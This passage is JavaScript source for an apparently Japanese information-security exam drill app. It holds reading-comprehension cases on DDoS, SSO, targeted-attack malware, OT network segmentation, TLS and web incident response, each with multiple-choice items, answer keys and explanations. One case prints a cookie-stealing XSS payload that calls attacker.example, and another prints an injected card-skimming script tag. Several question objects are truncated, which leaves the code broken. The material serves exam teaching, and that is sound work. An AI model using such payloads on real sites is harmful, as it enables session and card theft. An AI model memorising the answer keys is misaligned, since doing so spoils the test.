<p>(1) 攻撃の送信元は多数のIPアドレスに分散しており、【 a 】と呼ばれる、乗っ取られた多数の機器で構成されるネットワークが用いられた可能性が高い。<br>(2) 近年は、ダークウェブ等で提供される【 b 】を利用することで、専門的な技術や設備がなくても攻撃を実行できてしまう。実際に、この種のサービスを利用した中学生が摘発された事例もある。<br>(3) <u>②Webサイトが停止している間、利用者への状況の告知ができなかった</u>ことが、混乱を大きくした。</p>
<p>H社は再発防止策として、DDoS攻撃の影響を緩和する【 c 】の利用、ネットワークの冗長化、及び<u>③非常時用の代替手段の事前準備</u>を進めることにした。</p>`,
questions:[
{id:"rc6q1",theme:"threat",q:"本文中の【 a 】に入れる字句として、最も適切なものはどれか。",
c:["ボットネット","ハニーポット","ダークネット","サンドボックス"],a:0,
e:"マルウェア感染などで乗っ取られた多数の機器が攻撃者の命令で一斉に動作する。脆弱性が放置されたIoT機器が構成要素として悪用される事例が多く、機器側の対策も社会的な要請になっている。"},
{id:"rc6q2",theme:"threat",q:"本文中の【 b 】に入れる字句として、最も適切なものはどれか。",
c:["DDoS攻撃の代行サービス(IPストレッサー等)","脆弱性診断サービス","クラウドバックアップサービス","証明書発行サービス"],a:0,
e:"攻撃の実行が有償サービスとして提供されており、攻撃の敷居が著しく下がっている。攻撃の依頼自体が犯罪であり、警察庁も注意を呼びかけている。"},
{id:"rc6q3",theme:"threat",q:"本文中の【 c 】に入れる字句として、最も適切なものはどれか。",
c:["CDN(コンテンツデリバリネットワーク)","VPN装置","メールゲートウェイ","ファイルサーバ"],a:0,
e:"分散配置された配信網でトラフィックを受け止めて分散・吸収することで、自組織の回線や機器への負荷を軽減できる。DDoS対策サービスやWAF、IDS/IPSとの併用も挙げられている。"},
{id:"rc6q4",theme:"threat",q:"下線①の攻撃が一般的な対策では防ぎにくい理由として、最も適切なものはどれか。",
c:["帯域を狙う攻撃とアプリケーション処理を狙う攻撃が同時に行われ、単一の対策では両方に対処できないから",
"攻撃通信が全て暗号化されているから",
"攻撃元が常に単一のIPアドレスだから",
"攻撃が業務時間外にしか行われないから"],a:0,
e:"レイヤ3/4の攻撃は回線帯域や機器の処理能力を、レイヤ7の攻撃はWebアプリケーションの処理を枯渇させる。それぞれ有効な対策が異なるため、多層的な備えが必要になる。"},
{id:"rc6q5",theme:"threat",q:"下線②及び下線③を踏まえた事前準備として、最も適切なものはどれか。",
c:["Webサイト停止時の代替サーバと、SNS等の別経路による告知手段をあらかじめ用意し、手順を定めておく",
"停止時は復旧まで一切の情報発信を行わないと定めておく",
"告知は復旧後にまとめて行うと定めておく",
"利用者からの問合せ窓口を閉鎖すると定めておく"],a:0,
e:"攻撃対象のサイト自体が使えないため、同じ経路での告知は成り立たない。代替サーバや別経路の告知手段を平時に用意し、マニュアル化しておくことが利用者の混乱を抑える。"}]}
);

// ===== 未カバーテーマの読解演習(認証・マルウェア・ネットワーク・暗号) =====
CASES.push(
{id:"rc7", theme:"auth", title:"認証基盤の刷新とSSO導入", minutes:12,
body:`<p>K社は、従業員数500名のサービス業である。K社は業務で10種類のSaaSを利用しているが、利用者IDとパスワードをSaaSごとに個別に管理しており、従業員から「パスワードの管理が煩雑だ」との声が上がっていた。実際に、複数のSaaSで同一のパスワードを使い回している従業員がいることも判明した。</p>
<p>情報システム部のLさんは、認証基盤を刷新し、IdPを導入したシングルサインオン(SSO)へ移行することを提案した。移行後の認証の流れは次のとおりである。</p>
<p>(1) 従業員がSaaS(SP)にアクセスすると、IdPへ転送される。<br>(2) IdPが従業員を認証し、認証結果を含む署名付きの【 a 】を発行する。<br>(3) SPは署名を検証し、正当であればアクセスを許可する。</p>
<p>Lさんは「この方式では、<u>①従業員のパスワードがSPに渡らない</u>という利点がある」と説明した。一方で、部長のM氏は「<u>②SSOには集約したことによる新たなリスクもある</u>」と指摘した。</p>
<p>そこでLさんは、IdPでの認証にパスワードに加えて【 b 】を要求する設定とし、さらに、普段と異なる接続元や時間帯からのアクセスを検知した場合に追加の認証を求める<u>③リスクベース認証</u>を有効にすることにした。</p>
<p>また、K社では退職者のSaaSアカウントの無効化漏れが過去に発生していた。Lさんは「<u>④SSOへの移行により、この問題への対処もしやすくなる</u>」と述べた。</p>`,
questions:[
{id:"rc7q1",theme:"auth",q:"本文中の【 a 】に入れる字句として、最も適切なものはどれか。",
c:["利用者の認証結果や属性を含むアサーション","利用者が入力したパスワードのハッシュ値","SPが生成したセッションIDの一覧表","IdPの秘密鍵とその有効期限の情報"],a:0,
e:"SAMLではIdPが署名付きアサーションを発行し、SPがその署名を検証して認証を成立させる。OIDCの場合はIDトークン(署名付きJWT)が同じ役割を果たす。"},
{id:"rc7q2",theme:"auth",q:"下線①の利点がもたらす効果として、最も適切なものはどれか。",
c:["SP側が侵害されても、そこから従業員のパスワードが漏えいすることはない",
"SP側の通信を暗号化する必要がなくなり運用が簡素になる",
"SP側でアクセスログを取得する必要がなくなり負荷が下がる",
"SP側の障害時にもIdPが処理を代行できるようになる"],a:0,
e:"認証情報を預ける先がIdPに一元化されるため、多数のSPそれぞれにパスワードを保持させる構成に比べ、漏えいの発生点を減らせる。"},
{id:"rc7q3",theme:"auth",q:"下線②について、M氏が指摘したリスクとして、最も適切なものはどれか。",
c:["IdPの認証情報が窃取されると、連携する全てのSaaSへ不正アクセスされる",
"IdPを導入するとSaaSごとのパスワード使い回しが増加してしまう",
"IdPの導入によってSaaSの利用料金が大幅に増加してしまう",
"IdPを経由することでSaaSへの接続が必ず不安定になる"],a:0,
e:"利便性と引換えに侵害時の影響が集約される。IdPの認証強化と、IdP自体の監視・保護が不可欠になる理由がここにある。"},
{id:"rc7q4",theme:"auth",q:"本文中の【 b 】に入れる字句として、最も適切なものはどれか。",
c:["認証アプリやセキュリティキーによる所持要素の確認","より長い文字数のパスワードの再入力の要求","登録時に設定した秘密の質問への回答の入力","前回ログイン時と同一のIPアドレスの使用"],a:0,
e:"パスワード(知識)と異なる要素を組み合わせることが多要素認証の要件。秘密の質問は知識要素であり、組み合わせても多要素にはならない。"},
{id:"rc7q5",theme:"auth",q:"下線④について、SSOへの移行が退職者のアカウント管理を改善する理由として、最も適切なものはどれか。",
c:["IdP側で利用者を無効化すれば、連携する全てのSaaSへのアクセスを一括して遮断できる",
"SaaS側のアカウントが退職日に自動的に課金対象から外れる仕組みが働くから",
"退職者が使用していたパスワードを他の従業員へ引き継げるようになるから",
"SaaSごとに個別の無効化手続を行う運用がそのまま維持されるから"],a:0,
e:"認証の入口が一元化されるため、無効化漏れによる残存アクセスのリスクを大きく下げられる。人事情報と連動したプロビジョニングと併用するとさらに確実になる。"}]},

{id:"rc8", theme:"malware", title:"標的型攻撃メールによる侵害", minutes:12,
body:`<p>N社は、精密機器の製造会社である。ある日、開発部のP氏宛てに、取引先の担当者名を差出人とする「見積書の件」という件名のメールが届いた。本文には過去の実際のやり取りが引用されており、P氏は不審に思わず添付の文書ファイルを開いた。ファイルを開くと「編集を有効にする」よう促す表示が現れ、P氏はこれをクリックした。</p>
<p>2週間後、N社が契約するセキュリティ監視サービスから「開発部のPC-07から、外部への不審な通信を検知した」との連絡があった。調査の結果、判明した事象を表1に示す。</p>
<table class="p-table"><caption>表1 判明した事象</caption>
<tr><th>時期</th><th>事象</th></tr>
<tr><td>1日目</td><td>P氏が添付ファイルを開き、マクロを有効化</td></tr>
<tr><td>1日目</td><td>PC-07から外部サーバへの接続。追加のプログラムが取得された</td></tr>
<tr><td>2日目以降</td><td>PC-07から外部の同一ホストへ、10分間隔の通信が継続</td></tr>
<tr><td>8日目</td><td>PC-07から、開発部の共有サーバへの管理者権限での接続が成功</td></tr>
</table>
<p>調査を担当したQさんは、2日目以降の通信について<u>①C&C通信であると判断した</u>。また、8日目の事象について「<u>②攻撃者が横展開を試みている</u>」と判断した。</p>
<p>Qさんは、PC-07をネットワークから隔離した上で、<u>③電源は切らずに調査を行った</u>。PC-07を調べたところ、実行ファイルはディスク上に存在せず、OS標準のスクリプト実行環境がメモリ上で悪用されていた。Qさんは「この手口は【 a 】と呼ばれ、従来型のウイルス対策ソフトでは検知が難しい」と説明した。</p>
<p>N社は再発防止策として、インターネット由来の文書ファイルの<u>④マクロを既定で無効化する設定</u>を全社に適用し、あわせて端末の挙動を記録・監視する【 b 】の導入を決定した。</p>`,
questions:[
{id:"rc8q1",theme:"malware",q:"本文の攻撃メールが、受信者に不審を抱かせにくかった理由として、最も適切なものはどれか。",
c:["実在の取引先担当者を装い、過去の実際のやり取りが引用されていたから",
"メールが暗号化されており内容を確認できない状態だったから",
"送信元のドメインがN社の社内ドメインと完全に一致していたから",
"添付ファイルが実行形式ではなく圧縮形式になっていたから"],a:0,
e:"実際のやり取りへの返信を装う手口は、いずれかの側のメールボックスが侵害されている可能性を示す。受信者の警戒を解くため、技術的対策と訓練の両輪が必要になる。"},
{id:"rc8q2",theme:"malware",q:"下線①の判断根拠として、最も適切なものはどれか。",
c:["業務と無関係の同一ホストに対し、10分間隔という規則的な通信が継続しているから",
"通信量が通常の業務通信と比べて極端に大きくなっているから",
"通信が業務時間内に限定して発生しているから",
"通信先が国内のIPアドレスに限定されているから"],a:0,
e:"一定間隔で指令を確認しにいくビーコンが特徴で、時間帯を問わない規則性が正常な通信との違いになる。通信量が小さくても検知の手掛かりになる。"},
{id:"rc8q3",theme:"malware",q:"下線②の横展開を抑止する対策として、最も適切なものはどれか。",
c:["ネットワークを分割し、端末間及び端末からサーバへの不要な通信を遮断する",
"全ての端末とサーバを同一のセグメントに集約して管理を簡素化する",
"共有サーバの管理者パスワードを全サーバで共通の値に統一する",
"端末の利用者全員に管理者権限を付与して作業効率を向上させる"],a:0,
e:"侵入後の内部移動は、到達可能な範囲の広さと資格情報の共通化によって容易になる。セグメント分割、通信制御、特権資格情報の分離が抑止の柱になる。"},
{id:"rc8q4",theme:"malware",q:"下線③の理由として、最も適切なものはどれか。",
c:["メモリ上にのみ存在する実行中のプロセスや通信の情報を保全するため",
"電源を切ると隔離した状態が自動的に解除されてしまうため",
"電源を切るとディスク上のログが全て初期化されてしまうため",
"電源を入れたままにすると駆除処理が自動で完了するため"],a:0,

{id:"rc9", theme:"network", title:"工場ネットワークのセグメント分離", minutes:12,
body:`<p>R社は、部品を製造する企業であり、本社と工場を持つ。工場には、製造装置を制御する制御システム(以下、OTネットワークという)がある。従来、OTネットワークは情報系ネットワークと物理的に分離されていたが、生産実績を本社の生産管理システムへ自動連携する要件が生じ、両者を接続することになった。</p>
<p>接続に当たり、情報システム部のSさんは、両ネットワークの間に中継用のセグメントを設け、そこに連携用サーバを配置する構成を提案した。この中継用セグメントは、公開サーバを配置するDMZと同様の考え方に基づくものである。</p>
<p>Sさんが設計したファイアウォールのルールの一部を表1に示す。</p>
<table class="p-table"><caption>表1 ファイアウォールのルール(抜粋)</caption>
<tr><th>項番</th><th>送信元</th><th>宛先</th><th>動作</th></tr>
<tr><td>1</td><td>OTネットワーク</td><td>連携用サーバ</td><td>許可</td></tr>
<tr><td>2</td><td>生産管理システム</td><td>連携用サーバ</td><td>許可</td></tr>
<tr><td>3</td><td>OTネットワーク</td><td>インターネット</td><td>拒否</td></tr>
<tr><td>4</td><td>情報系ネットワーク</td><td>OTネットワーク</td><td>拒否</td></tr>
<tr><td>5</td><td>全て</td><td>全て</td><td>拒否</td></tr>
</table>
<p>Sさんは「<u>①項番5を最後に置くことが、このルール設計の前提になる</u>」と説明した。また、項番4について「<u>②情報系からOTへの直接の通信を認めないことが、この設計の要点である</u>」と述べた。</p>
<p>製造装置の保守は装置ベンダーが行っており、従来はベンダー技術者が工場に来訪して作業していた。今回、遠隔保守の要望が出されたが、部長のT氏は「<u>③外部からOTネットワークへ直接接続させる方式は認められない</u>」と述べ、<u>④踏み台となるサーバを経由し、操作内容を記録する方式</u>を採用することにした。</p>
<p>また、OTネットワークの装置には、サポートが終了したOSを搭載し、パッチを適用できないものが含まれていた。Sさんは「パッチを適用できない以上、【 a 】によって攻撃が到達すること自体を防ぐ必要がある」と述べた。</p>`,
questions:[

e:"ファイアウォールはルールを上から順に評価するため、最後に全拒否を置くことで、想定していない通信が意図せず通ることを防げる。許可ルールの棚卸しも運用上の要点になる。"},

e:"情報系はメールやWeb閲覧など侵入経路が多く、侵害される前提で設計する必要がある。連携は中継セグメントの限定された通信に絞ることで、影響の波及を断つ。"},
{id:"rc9q3",theme:"network",q:"下線③の方式が認められない理由として、最も適切なものはどれか。",
c:["ベンダー側の環境が侵害された場合に、そこを経由してOTネットワークへ侵入されるおそれがあるから",

{id:"rc9q5",theme:"network",q:"本文中の【 a 】に入れる字句として、最も適切なものはどれか。",

{id:"rc10", theme:"crypto", title:"サーバ証明書の運用とTLS設定", minutes:12,
body:`<p>U社は、Webサービスを提供する企業である。ある日の朝、利用者から「サイトにアクセスすると警告が表示される」との問合せが多数寄せられた。担当のVさんが確認したところ、ブラウザに証明書の有効期限切れを示す警告が表示されていた。</p>
<p>調査の結果、サーバ証明書の更新作業が漏れていたことが判明した。U社では証明書の更新を担当者が手作業で管理しており、<u>①管理台帳の記載漏れ</u>により失効日が把握されていなかった。</p>
<p>Vさんは、再発防止策として証明書の自動更新の仕組みを導入するとともに、有効期限を監視して事前に通知する仕組みを整備することにした。</p>
<p>この機会にVさんは、TLSの設定も見直すことにした。現状の設定では、古いバージョンのTLSや、既に安全性が低下したとされる暗号スイートが有効になっていた。Vさんは「<u>②危殆化した暗号方式を無効化する必要がある</u>」と述べ、【 a 】が公表する電子政府推奨暗号のリストを参照して設定を見直した。</p>
<p>また、Vさんは鍵交換方式についても確認し、<u>③一時的な鍵を用いる方式を優先する設定</u>とした。この方式では、仮にサーバの秘密鍵が将来漏えいしても、過去に記録された通信を復号されることがない。この性質を【 b 】という。</p>
<p>さらにVさんは、利用者が誤ってHTTPで接続した場合に備え、<u>④以降のアクセスをHTTPSに限定させるHTTPヘッダ</u>を設定した。</p>
<p>なお、U社では業務システムの一部で私的な認証局が発行した証明書を使用しており、従業員には警告が表示されても無視するよう案内していた。Vさんは「<u>⑤この運用には問題がある</u>」と指摘した。</p>`,
questions:[
{id:"rc10q1",theme:"crypto",q:"下線①のような失念を防ぐ仕組みとして、最も適切なものはどれか。",
c:["証明書の有効期限を自動で監視し、期限前に担当者へ通知する仕組みを導入する",
"証明書の有効期間を可能な限り長く設定して更新の機会を減らす",
"証明書の管理台帳を担当者ごとに個別に作成して分散管理する",
"証明書の更新作業を年度末にまとめて実施する運用に変更する"],a:0,
e:"有効期間の短縮化が進む中、人手による管理は破綻しやすい。自動更新と期限監視の組合せで、人為的な失念に依存しない運用にする必要がある。"},
{id:"rc10q2",theme:"crypto",q:"本文中の【 a 】に入れる字句として、最も適切なものはどれか。",
c:["CRYPTREC","OWASP","JVN","CVSS"],a:0,
e:"暗号技術の安全性を評価し、電子政府における推奨暗号を公表している。危殆化した方式からの移行判断の根拠として参照される。"},
{id:"rc10q3",theme:"crypto",q:"下線②について、無効化すべき対象として最も適切なものはどれか。",
c:["SSL 3.0やTLS 1.0といった古いプロトコル、及びRC4などの脆弱な暗号方式",
"TLS 1.3で規定されている暗号スイート全般",
"公開鍵暗号を用いた全ての鍵交換方式",
"証明書チェーンの検証を行う全ての処理"],a:0,
e:"既知の攻撃手法が確立された方式を有効にしたままだと、ダウングレードによって弱い設定に誘導されるおそれがある。対応ブラウザの状況を確認しつつ無効化する。"},
{id:"rc10q4",theme:"crypto",q:"本文中の【 b 】に入れる字句として、最も適切なものはどれか。",
c:["前方秘匿性(Forward Secrecy)","否認防止(Non-repudiation)","可用性(Availability)","完全性(Integrity)"],a:0,
e:"ECDHEなど一時鍵による鍵交換では、セッション鍵がサーバの長期秘密鍵から導出されないため、秘密鍵の漏えいが過去の通信の安全性に波及しない。"},
{id:"rc10q5",theme:"crypto",q:"下線⑤について、Vさんが指摘した問題点として、最も適切なものはどれか。",
c:["警告を無視する習慣が定着すると、実際の中間者攻撃による警告も見過ごされるようになる",
"私的な認証局が発行した証明書は通信を暗号化する機能を持っていない",
"警告を無視すると通信がHTTPに自動的に切り替わり平文で送信される",
"私的な認証局の証明書は有効期限を設定することができない"],a:0,
e:"警告に対する感度が下がることが本質的な問題になる。社内の認証局証明書を端末に配布して信頼させるなど、警告が出ない状態を作ることが正しい対処になる。"}]}
);

{id:"wl1", theme:"incident", title:"通販サイトにおけるインシデント対応", minutes:40,
body:`<p>A社は、従業員数600名の日用品の通信販売事業者である。A社は、自社開発の通販サイト(以下、サイトAという)を運営しており、会員数は約80万人である。会員はサイトAで氏名、住所、電話番号及びクレジットカード情報を登録できる。</p>
<p>A社のネットワーク構成を図1に示す。</p>
<table class="p-table"><caption>図1 A社のネットワーク構成(抜粋)</caption>
<tr><th>区分</th><th>設置機器</th><th>概要</th></tr>
<tr><td>DMZ</td><td>Webサーバ</td><td>サイトAを公開する。TLSで会員のブラウザと通信する。</td></tr>
<tr><td>DMZ</td><td>リバースプロキシ</td><td>インターネットからWebサーバへの通信を中継し、通信ログを記録する。</td></tr>
<tr><td>内部</td><td>APサーバ</td><td>サイトAの業務ロジックを実行する。</td></tr>
<tr><td>内部</td><td>DBサーバ</td><td>会員情報、注文情報を保持する。</td></tr>
<tr><td>内部</td><td>認証サーバ</td><td>従業員の業務システム利用時の認証を行う。</td></tr>
<tr><td>内部</td><td>プロキシサーバ</td><td>従業員のPCからインターネットへの通信を中継する。</td></tr>
</table>
<p>A社の情報システム部には、部長のB氏、運用担当のCさん及びDさんが在籍している。A社は、CSIRTを設置しているが、専任者はおらず、インシデント発生時に情報システム部と法務部、広報部から要員を招集する体制である。</p>
<h4>〔不正利用の申告〕</h4>
<p>ある年の10月3日、サイトAの会員から「サイトAでしか使っていないクレジットカードが不正に利用された」との申告がカスタマーサポートに寄せられた。10月5日までに同様の申告は12件に達した。カスタマーサポートからの連絡を受け、B氏はCSIRTを招集した。</p>
<p>Cさんは、まずサイトAの決済処理を確認した。サイトAでは、会員が入力したクレジットカード情報を、APサーバが決済代行事業者へ送信して決済を行っており、<u>①カード番号はDBサーバに保存していなかった</u>。それにもかかわらず不正利用が発生していることから、Cさんは「カード情報が保存場所から漏えいしたのではなく、入力から送信までの過程で窃取された可能性がある」と考えた。</p>
<h4>〔Webサーバの調査〕</h4>
<p>Dさんは、サイトAの決済画面のHTMLを確認した。その結果、A社が意図していない次のスクリプトタグが挿入されていることを発見した。</p>
<pre class="code">&lt;script src="https://cdn-payment-helper.example/lib.js"&gt;&lt;/script&gt;</pre>
<p>Dさんが当該スクリプトの内容を確認したところ、決済画面の入力欄に入力された文字列を、外部のサーバへ送信する処理が含まれていた。<u>②この手口では、会員のブラウザ上で情報が窃取されるので、A社のサーバに保存されていない情報も窃取され得る。</u></p>
<p>Webサーバのファイル更新日時を調べたところ、決済画面のテンプレートファイルが9月8日に更新されていた。A社の変更管理記録には、この日のリリース作業は記録されていなかった。</p>
<h4>〔侵入経路の調査〕</h4>
<p>Cさんは、リバースプロキシの通信ログを調査した。9月上旬の記録から抽出した内容を表1に示す。</p>
<table class="p-table"><caption>表1 リバースプロキシの通信ログ(抜粋)</caption>
<tr><th>日時</th><th>送信元IPアドレス</th><th>要求URL</th><th>応答</th></tr>
<tr><td>9月6日 03:12</td><td>x1.x1.x1.x1</td><td>/admin/login</td><td>200</td></tr>
<tr><td>9月6日 03:12〜04:50</td><td>x1.x1.x1.x1</td><td>/admin/login(約3,800回)</td><td>200</td></tr>
<tr><td>9月6日 04:51</td><td>x1.x1.x1.x1</td><td>/admin/dashboard</td><td>200</td></tr>
<tr><td>9月8日 02:30</td><td>x1.x1.x1.x1</td><td>/admin/template/edit</td><td>200</td></tr>
</table>
<p>/admin/以下は、A社の運用担当者が商品情報や画面テンプレートを編集するための管理機能である。管理機能は、利用者IDとパスワードだけで認証しており、インターネットから接続できる状態であった。9月6日に使用された利用者IDは、運用担当者が共用しているIDであった。</p>
<p>Cさんは、表1の9月6日03:12から04:50の記録について、<u>③攻撃の種類を特定した</u>。また、B氏は「<u>④管理機能がこの状態で公開されていたことが、そもそもの問題である</u>」と述べた。</p>
<h4>〔影響範囲の特定〕</h4>
<p>CSIRTは、スクリプトが挿入されていた9月8日から、削除した10月5日までの間に決済画面でカード情報を入力した会員が影響を受けたと判断した。注文情報から、該当期間の決済件数は約2万4,000件であった。</p>
<p>広報部から「窃取された可能性のある情報を特定し、対外公表の内容を確定したい」との要請を受け、Dさんは<u>⑤窃取された可能性のある情報の範囲</u>を、挿入されていたスクリプトの処理内容から特定した。</p>
<p>法務部のE氏は「本件は個人データの漏えいのおそれがある事態に該当するので、【 a 】への報告と、本人への通知が必要になる」と述べた。</p>
<h4>〔対応と再発防止策〕</h4>
<p>A社は、スクリプトの削除、管理機能の停止、及び全運用担当者のパスワード変更を実施した。さらにCさんは、<u>⑥スクリプトを削除するだけでは対応として不十分である</u>と指摘した。</p>
<p>再発防止策として、A社は次を実施することにした。</p>
<p>(1) 管理機能へのアクセスを、社内ネットワーク及びVPN経由に限定する。<br>(2) 管理機能の認証に多要素認証を導入する。<br>(3) 共用IDを廃止し、運用担当者ごとに利用者IDを発行する。<br>(4) 公開ファイルの変更を検知する仕組みを導入する。<br>(5) 決済画面で読み込む外部スクリプトを制限するため、【 b 】と呼ばれるHTTPヘッダを設定する。</p>`,
questions:[

{id:"wl2", theme:"web", title:"Webアプリケーションプログラムの開発とAPI連携", minutes:40,
body:`<p>F社は、従業員数350名の人材紹介会社である。F社は、求職者向けのWebサイト(以下、サイトFという)と、求人企業向けのAPI(以下、APIFという)を自社開発している。開発課には、課長のG氏、開発担当のHさん及びJさんが在籍している。</p>
<h4>〔サイトFの概要〕</h4>
<p>サイトFの主な機能を表1に示す。</p>
<table class="p-table"><caption>表1 サイトFの主な機能</caption>
<tr><th>機能</th><th>概要</th><th>認証の要否</th></tr>
<tr><td>求人検索</td><td>条件を指定して求人を検索する。</td><td>不要</td></tr>
<tr><td>会員登録</td><td>求職者が氏名、連絡先、職務経歴を登録する。</td><td>不要</td></tr>
<tr><td>職務経歴書ダウンロード</td><td>登録した職務経歴書のPDFを取得する。</td><td>要</td></tr>
<tr><td>応募</td><td>求人に応募する。</td><td>要</td></tr>
<tr><td>企業向けAPI(APIF)</td><td>求人企業が応募者情報を取得する。</td><td>要</td></tr>
</table>
<p>F社は、サイトFの改修に当たり、セキュリティ専門会社のKさんによるレビューを受けることにした。</p>
<h4>〔職務経歴書ダウンロード機能のレビュー〕</h4>
<p>Hさんが実装した職務経歴書ダウンロード機能の処理を図1に示す。求職者は、マイページのリンクからGETパラメタfileを指定して本機能を呼び出す。リンクには、当該求職者の職務経歴書のファイル名が設定される。</p>
<pre class="code">// 図1 職務経歴書ダウンロード機能(抜粋)
1: function download(request) {
2:   if (session.user_id == null) {
3:     return redirect("/login");
4:   }
5:   name = request.getParam("file");
6:   path = "/var/data/resume/" + name;
7:   return sendFile(path);
8: }</pre>
<p>Kさんは、図1について「<u>①第三者が他人の職務経歴書を取得できるおそれがある</u>」と指摘した。さらに「<u>②想定していないファイルまで取得されるおそれもある</u>」と述べ、2つの脆弱性を指摘した。</p>
<p>Kさんは、修正方針として「<u>③ファイル名をパラメタで受け取る設計自体を改める</u>べきだ」と助言した。</p>
<h4>〔会員登録機能のレビュー〕</h4>
<p>会員登録機能では、求職者が入力した職務経歴がそのままデータベースに保存され、企業向けの応募者一覧画面に表示される。Kさんは、職務経歴の欄に次の文字列を入力して動作を確認した。</p>
<pre class="code">&lt;img src=x onerror="fetch('https://attacker.example/?c='+document.cookie)"&gt;</pre>
<p>その結果、応募者一覧画面を開いた企業担当者のブラウザで当該処理が実行された。Kさんは「<u>④この脆弱性は、求職者ではなく企業担当者が被害を受ける点に注意が必要だ</u>」と述べた。</p>
<p>なお、サイトFのセッション管理用cookieには、Secure属性は設定されていたが、【 a 】属性が設定されていなかった。</p>
<h4>〔APIFのレビュー〕</h4>
<p>Jさんが実装したAPIFの仕様を表2に示す。求人企業は、事前に発行されたアクセストークンをAuthorizationヘッダに設定して要求する。</p>
<table class="p-table"><caption>表2 APIFの仕様(抜粋)</caption>
<tr><th>項番</th><th>エンドポイント</th><th>概要</th></tr>
<tr><td>1</td><td>GET /api/applicants?job_id={id}</td><td>指定した求人への応募者の一覧を返す。</td></tr>
<tr><td>2</td><td>GET /api/applicants/{applicant_id}</td><td>指定した応募者の詳細(氏名、連絡先、職務経歴)を返す。</td></tr>
</table>
<p>Kさんは、項番2について、<u>⑤ある求人企業のアクセストークンを用いて、当該企業に応募していない求職者の情報を取得できる</u>ことを確認した。</p>
<p>また、アクセストークンには有効期限が設定されておらず、一度発行すると無期限に使用できる仕様であった。Kさんは「<u>⑥有効期限を設定すべきだ</u>」と指摘した。</p>
<p>さらにJさんは「APIFは検索処理に負荷が掛かるので、大量の要求が来ると応答が遅くなる」と述べた。Kさんは、対策として【 b 】を導入し、一定時間内の要求数を制限することを提案した。</p>
<h4>〔ログイン機能のレビュー〕</h4>
<p>サイトFのログイン機能では、利用者IDとして求職者のメールアドレスを使用している。ログイン失敗時のエラーメッセージは、次のように区別して表示されていた。</p>
<p>・入力されたメールアドレスが未登録の場合:「このメールアドレスは登録されていません」<br>・パスワードが誤っている場合:「パスワードが誤っています」</p>
<p>Kさんは「<u>⑦このエラーメッセージの出し分けには問題がある</u>」と指摘した。</p>
<p>G氏は、Kさんの指摘を踏まえて修正計画を策定し、修正後に再レビューを受けることにした。</p>`,

// ===== 状態管理・永続化 =====
const STORE_KEY = "sc-drill-v1";
let DATA = { q:{}, sessions:[], days:[] }; // q: {qid:{a:attempts,c:correct,last:0/1,at:ts}}

// 保存先の自動判定: Claudeアーティファクト環境 → ブラウザのlocalStorage → メモリのみ
const store = (()=>{
  if (typeof window !== "undefined" && window.storage && typeof window.storage.get === "function"){
    return {
      name: "claude",
      async get(){ try{ const r = await window.storage.get(STORE_KEY); return r && r.value ? r.value : null; }catch(e){ return null; } },
      async set(v){ try{ await window.storage.set(STORE_KEY, v); }catch(e){} },
      async del(){ try{ await store.del(); }catch(e){} }
    };
  }
  try{
    localStorage.setItem("__sc_test","1"); localStorage.removeItem("__sc_test");
    return {
      name: "local",
      async get(){ return localStorage.getItem(STORE_KEY); },
      async set(v){ localStorage.setItem(STORE_KEY, v); },
      async del(){ localStorage.removeItem(STORE_KEY); }
    };
  }catch(e){}
  let mem = null;
  return { name:"memory",
    async get(){ return mem; }, async set(v){ mem = v; }, async del(){ mem = null; } };
})();

async function loadData(){
  try{
    const v = await store.get();
    if(v) DATA = JSON.parse(v);
  }catch(e){ /* 保存データ破損時は初期状態で開始 */ }
}
async function saveData(){
  try{ await store.set(JSON.stringify(DATA)); }catch(e){}
}
function today(){ const d=new Date(); return d.getFullYear()+"-"+String(d.getMonth()+1).padStart(2,"0")+"-"+String(d.getDate()).padStart(2,"0"); }

// ===== ユーティリティ =====
const $ = id => document.getElementById(id);
const byId = {}; QUESTIONS.forEach(q=>byId[q.id]=q);
const themeById = {}; THEMES.forEach(t=>themeById[t.id]=t);
function shuffle(arr){ const a=arr.slice(); for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];} return a; }
function qStat(qid){ return DATA.q[qid] || {a:0,c:0,last:null}; }
function themeStats(tid){
  const qs = QUESTIONS.filter(q=>q.theme===tid);
  let attempted=0, correctLast=0, att=0, cor=0;
  qs.forEach(q=>{ const s=qStat(q.id); if(s.a>0){attempted++; att+=s.a; cor+=s.c; if(s.last===1)correctLast++; } });
  return { total:qs.length, attempted, acc: att? Math.round(cor/att*100):null, att, cor };
}

    let attempted=0, lastCorrect=0;
    ids.forEach(id=>{ const s=qStat(id); if(s.a>0){attempted++; if(s.last===1)lastCorrect++;} });
    const pct = attempted? Math.round(lastCorrect/ids.length*100) : null;

      <div class="meta">${themeById[c.theme].name} ｜ 本文約${chars}字・設問${ids.length}問 ｜ 目安${c.minutes}分</div>
